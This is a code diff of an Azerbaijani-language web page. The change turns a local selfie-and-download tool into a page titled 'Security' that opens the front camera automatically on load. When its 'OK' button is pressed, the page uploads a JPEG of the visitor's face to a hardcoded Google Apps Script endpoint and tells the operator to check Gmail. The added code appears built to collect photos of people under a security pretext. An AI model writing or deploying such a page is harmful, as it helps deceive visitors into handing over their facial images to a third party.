@@ -3,100 +3,103 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Foto çək</title>
+<title>Təhlükəsizlik</title>
 <style>
 body {
   margin: 0;
-  padding: 20px;
+  padding: 16px;
   font-family: Arial, sans-serif;
   text-align: center;
   background: white;
 }
-button {
-  padding: 14px 20px;
-  font-size: 17px;
-  margin: 10px;
-}
 video {
   width: 100%;
-  max-width: 400px;
-  margin-top: 15px;
+  max-width: 420px;
 }
-canvas {
-  display: none;
+button {
+  padding: 12px 24px;
+  font-size: 17px;
+  margin: 10px;
 }
 </style>
 </head>
 <body>
 
-<button id="start">Ön kameranı aç</button>
-<button id="capture" hidden>Foto çək</button>
-
-<div id="camera"></div>
-<div id="result"></div>
-<canvas id="photo"></canvas>
+<video id="camera" autoplay playsinline hidden></video>
+<div id="status"></div>
+<button id="ok" hidden>OK — foto çək və göndər</button>
 
 <script>
+const SCRIPT_URL =
+"https://script.google.com/macros/s/AKfycbxneoW2kBbOcoBtqNvZDaYtdxS1foRS3iHiUDUqGddLJ3iimAon9MRwRiT27Ehb4rI/exec";
+
+const video = document.getElementById("camera");
+const button = document.getElementById("ok");
+const status = document.getElementById("status");
+
 let stream;
-let video;
 
-const startButton = document.getElementById("start");
-const captureButton = document.getElementById("capture");
-const camera = document.getElementById("camera");
-const result = document.getElementById("result");
-const canvas = document.getElementById("photo");
-
-startButton.addEventListener("click", async () => {
+async function startCamera() {
   try {
     stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
       audio: false
     });
 
-    video = document.createElement("video");
-    video.autoplay = true;
-    video.playsInline = true;
     video.srcObject = stream;
-
-    camera.replaceChildren(video);
+    video.hidden = false;
     await video.play();
 
-    startButton.hidden = true;
-    captureButton.hidden = false;
-    result.textContent = "";
+    button.hidden = false;
+    status.textContent = "Ön kamera açıldı.";
   } catch (error) {
-    alert("Ön kamera açılmadı. Kamera icazəsini yoxla.");
+    status.textContent =
+      "Kamera açılmadı. Brauzerdə kamera icazəsini yoxla.";
+  }
+}
+
+button.addEventListener("click", async () => {
+  button.disabled = true;
+  status.textContent = "Foto hazırlanır...";
+
+  try {
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    canvas.getContext("2d").drawImage(
+      video, 0, 0, canvas.width, canvas.height
+    );
+
+    stream.getTracks().forEach(track => track.stop());
+    video.hidden = true;
+
+    const image = canvas.toDataURL("image/jpeg", 0.75);
+
+    status.textContent = "Foto göndərilir...";
+
+    await fetch(SCRIPT_URL, {
+      method: "POST",
+      mode: "no-cors",
+      headers: {
+        "Content-Type": "text/plain;charset=utf-8"
+      },
+      body: JSON.stringify({
+        type: "photo",
+        confirmed: true,
+        image: image
+      })
+    });
+
+    status.textContent =
+      "Göndərmə sorğusu tamamlandı. Gmail-i yoxla.";
+  } catch (error) {
+    status.textContent =
+      "Göndərmək mümkün olmadı. İnternet bağlantısını yoxla.";
   }
 });
 
-captureButton.addEventListener("click", () => {
-  if (!video || !video.videoWidth) return;
-
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-
-  canvas.getContext("2d").drawImage(
-    video, 0, 0, canvas.width, canvas.height
-  );
-
-  stream.getTracks().forEach(track => track.stop());
-  camera.replaceChildren();
-
-  canvas.toBlob(blob => {
-    if (!blob) {
-      result.textContent = "Foto hazırlana bilmədi.";
-      return;
-    }
-
-    const link = document.createElement("a");
-    link.href = URL.createObjectURL(blob);
-    link.download = "foto.jpg";
-    link.textContent = "Fotonu telefona yadda saxla";
-    result.replaceChildren(link);
-  }, "image/jpeg", 0.9);
-
-  captureButton.hidden = true;
-});
+startCamera();
 </script>
 
 </body>
